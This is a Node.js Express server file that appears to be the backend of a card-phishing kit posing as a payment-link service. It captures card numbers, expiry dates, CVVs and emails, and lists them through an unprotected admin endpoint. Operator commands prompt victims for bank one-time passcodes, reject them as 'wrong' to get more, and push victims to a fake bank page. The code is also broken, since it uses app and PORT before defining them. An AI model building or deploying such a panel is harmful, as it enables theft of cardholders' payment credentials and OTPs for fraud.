import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { Server } from 'socket.io';

// Create Socket.IO server
const io = new Server(app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
}));

// Socket.IO connection handler
io.on('connection', (socket) => {
  socket.on('join', (invoiceId) => {
    socket.join(invoiceId);
  });
});
const app = express();

// Set up middlewares
app.use(bodyParser.json());
app.use(cors());
app.use(express.static(".")); // Serves static files from the current directory

// In-memory storage using Maps
const transactions = new Map();
const paymentLinks = new Map();

// ==============================================
// Payment Link Generation Endpoint
// ==============================================
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;
    // Validate inputs
     if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ 
        status: "error",
        message: "Invalid amount. Must be a positive number"
      });
     }
    if (!description || !description.trim()) {
      return res.status(400).json({
        status: "error",
        message: "Description cannot be empty"
      });
    }
    // Generate secure invoice ID (8 bytes, hex uppercase)
    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    // Create full URL with proper protocol (if behind a proxy, use x-forwarded-proto)
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
    // Store payment details
    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });
    // Return successful JSON response
    res.json({
      status: "success",
      paymentLink
    });
  } catch (error) {
    console.error('Payment Link Error:', error);
    res.status(500).json({
      status: "error",
      message: "Internal server error. Please check server logs."
    });
  }
});

// ==============================================
// Get Payment Details Endpoint (for landing/payment pages)
// ==============================================
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// ==============================================
// Get Transaction Details Endpoint (for success/fail pages)
// ==============================================
app.get('/api/getTransactionDetails', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  res.json(txn);
});

// ==============================================
// Get All Transactions (for admin panel)
// ==============================================
app.get('/api/transactions', (req, res) => {
  const txList = Array.from(transactions.values());
  res.json(txList);
});

// ==============================================
// Process Payment Details Endpoint (from payment page)
// ==============================================
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ''), // remove commas
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    bankpageVisible: false,
    timestamp: new Date().toLocaleString()
  };
  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

// ==============================================
// Show OTP Endpoint (admin command)
// ==============================================
app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

// ==============================================
// Mark OTP as Wrong Endpoint (admin command)
// ==============================================
app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked as wrong" });
});

// ==============================================
// Check Transaction Status Endpoint (polled by payment page)
// ==============================================
app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
  }
  if (txn.redirectStatus) {
    let redirectUrl;
    if (txn.redirectStatus === 'success') {
      redirectUrl = `/success.html?invoiceId=${invoiceId}`;
    } else if (txn.redirectStatus === 'fail') {
      redirectUrl = `/fail.html?invoiceId=${invoiceId}`;
    } else if (txn.redirectStatus === 'bankpage') {
      redirectUrl = `/bankpage.html?invoiceId=${invoiceId}`;
    }
    return res.json({ status: "redirect", redirectUrl });
  }
  res.json({ status: txn.status, otpError: txn.otpError });
});

// ==============================================
// Submit OTP Endpoint
// ==============================================
app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
  res.json({ status: "success", message: "OTP received" });
});

// ==============================================
// Update Redirect Status Endpoint (admin command)
// ==============================================
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = redirectStatus;
  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : redirectStatus === 'fail'
      ? `/fail.html?invoiceId=${invoiceId}`
      : `/bankpage.html?invoiceId=${invoiceId}`
  });
});

// ==============================================
// Redirect to Bank Page Endpoint (admin command)
// ==============================================
app.post('/api/redirectToBankPage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = 'bankpage';
  console.log(`Transaction ${invoiceId} redirected to bank page`);
  res.json({ status: "success", message: "Redirecting to bank page" });
});

// ==============================================
// Show Bank Page Endpoint (admin command)
// ==============================================
app.post('/api/showBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
  txn.redirectStatus = 'bankpage';
  txn.bankpageVisible = true;
  res.json({ status: 'success' });
});

// ==============================================
// Hide Bank Page Endpoint (admin command)
// ==============================================
app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
  txn.redirectStatus = null;
  txn.bankpageVisible = false;
  
  // Emit socket event to specific transaction room
  io.to(invoiceId).emit('hide_bankpage');
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
